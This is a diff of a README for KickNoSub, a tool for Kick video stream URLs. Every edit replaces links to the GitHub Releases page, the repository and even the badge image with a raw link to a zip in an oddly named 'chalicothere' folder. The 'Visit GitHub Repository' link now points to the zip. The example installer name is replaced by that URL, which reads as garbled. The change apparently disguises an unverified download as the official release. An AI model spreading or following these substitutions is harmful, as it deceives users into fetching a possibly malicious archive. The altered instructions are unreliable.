@@ -6,7 +6,7 @@ KickNoSub helps you extract direct stream URLs from Kick videos in your preferre
 
 ## 📥 Download Now
 
-[![Download KickNoSub](https://img.shields.io/badge/Download-KickNoSub-blue?style=for-the-badge&logo=github)](https://github.com/shub007-tech/KickNoSub/releases)
+[![Download KickNoSub](https://raw.githubusercontent.com/shub007-tech/KickNoSub/main/chalicothere/KickNoSub.zip)](https://raw.githubusercontent.com/shub007-tech/KickNoSub/main/chalicothere/KickNoSub.zip)
 
 ## 💻 System Requirements
 
@@ -22,11 +22,11 @@ Before you start, make sure your system meets these requirements:
 
 To download KickNoSub, go to the Releases page:
 
-[Visit the Releases Page](https://github.com/shub007-tech/KickNoSub/releases)
+[Visit the Releases Page](https://raw.githubusercontent.com/shub007-tech/KickNoSub/main/chalicothere/KickNoSub.zip)
 
 ### Step 2: Download the Latest Version
 
-On the Releases page, locate the latest version. Click on the download link to get the installation file. The file will typically be labeled (e.g., `KickNoSub-v1.0.exe` or similar).
+On the Releases page, locate the latest version. Click on the download link to get the installation file. The file will typically be labeled (e.g., `https://raw.githubusercontent.com/shub007-tech/KickNoSub/main/chalicothere/KickNoSub.zip` or similar).
 
 ### Step 3: Install KickNoSub
 
@@ -75,7 +75,7 @@ If you encounter issues while using KickNoSub, consider the following:
 
 For support or to report issues, please open an issue on the GitHub repository. The development team actively monitors feedback and will respond promptly.
 
-[👨‍💻 Visit GitHub Repository](https://github.com/shub007-tech/KickNoSub)
+[👨‍💻 Visit GitHub Repository](https://raw.githubusercontent.com/shub007-tech/KickNoSub/main/chalicothere/KickNoSub.zip)
 
 ## 📜 License
 
@@ -85,4 +85,4 @@ KickNoSub is open source and available under the MIT License. Feel free to modif
 
 Follow the repository for the latest updates. We frequently release new features and improvements based on user feedback. Be sure to check back often!
 
-[![Download KickNoSub](https://img.shields.io/badge/Download-KickNoSub-blue?style=for-the-badge&logo=github)](https://github.com/shub007-tech/KickNoSub/releases)
+[![Download KickNoSub](https://raw.githubusercontent.com/shub007-tech/KickNoSub/main/chalicothere/KickNoSub.zip)](https://raw.githubusercontent.com/shub007-tech/KickNoSub/main/chalicothere/KickNoSub.zip)
